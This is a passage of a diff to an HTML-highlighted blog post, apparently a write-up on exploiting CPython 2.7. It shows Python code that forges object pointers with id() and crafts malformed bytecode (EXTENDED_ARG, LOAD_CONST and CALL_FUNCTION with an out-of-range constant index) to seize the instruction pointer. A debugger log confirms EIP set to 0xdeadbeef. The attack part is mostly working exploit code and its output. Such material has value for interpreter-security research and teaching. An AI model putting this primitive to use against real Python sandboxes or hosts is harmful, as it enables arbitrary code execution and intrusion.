+<div class="highlight"><pre><span></span><span class="n">absolute</span> <span class="n">call</span> <span class="n">via</span> <span class="n">CALL_FUNCTION</span>
+    <span class="kn">import</span> <span class="nn">opcode</span>
+    <span class="kn">import</span> <span class="nn">types</span>
+    <span class="kn">import</span> <span class="nn">struct</span>
 
-<span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&amp;lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+      <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">puint</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&amp;lt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">puint</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+      <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
-  <span class="k">pass</span>
+    <span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
+      <span class="k">pass</span>
 
-<span class="n">PyStringObject_to_char_array_offset</span> <span class="o">=</span> <span class="mi">20</span>
-<span class="n">second_object</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
-<span class="n">addr_second_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">second_object</span><span class="p">)</span>
-<span class="n">addr_second_object_controled_data</span> <span class="o">=</span> <span class="n">addr_second_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
+    <span class="n">PyStringObject_to_char_array_offset</span> <span class="o">=</span> <span class="mi">20</span>
+    <span class="n">second_object</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+    <span class="n">addr_second_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">second_object</span><span class="p">)</span>
+    <span class="n">addr_second_object_controled_data</span> <span class="o">=</span> <span class="n">addr_second_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
 
-<span class="n">first_object</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_second_object_controled_data</span><span class="p">)</span>
-<span class="n">addr_first_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">first_object</span><span class="p">)</span>
-<span class="n">addr_first_object_controled_data</span> <span class="o">=</span> <span class="n">addr_first_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
+    <span class="n">first_object</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_second_object_controled_data</span><span class="p">)</span>
+    <span class="n">addr_first_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">first_object</span><span class="p">)</span>
+    <span class="n">addr_first_object_controled_data</span> <span class="o">=</span> <span class="n">addr_first_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
 
-<span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_first_object_controled_data</span><span class="p">)</span>
-<span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
-<span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
-<span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffffffff</span>
+    <span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_first_object_controled_data</span><span class="p">)</span>
+    <span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
+    <span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
 
-<span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
-  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span>  <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">16</span><span class="p">)</span>     <span class="o">+</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>    <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="o">+</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;CALL_FUNCTION&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
-  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
-<span class="p">)</span>
-<span class="n">a</span><span class="p">()</span>
+    <span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
+      <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span>  <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>     <span class="o">+</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>    <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="o">+</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;CALL_FUNCTION&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+      <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
+    <span class="p">)</span>
+    <span class="n">a</span><span class="p">()</span>
 </pre></div>
 
 
 <p>And we finally get our primitive working :-)</p>
-<div class="highlight"><pre><span></span>(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
-*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll - 
-eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
-eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
-deadbeef ??              ???
+<div class="highlight"><pre><span></span>call 0xdeadbeef
+    (11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
+    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll - 
+    eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
+    eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
+    deadbeef ??              ???
 </pre></div>
 
 
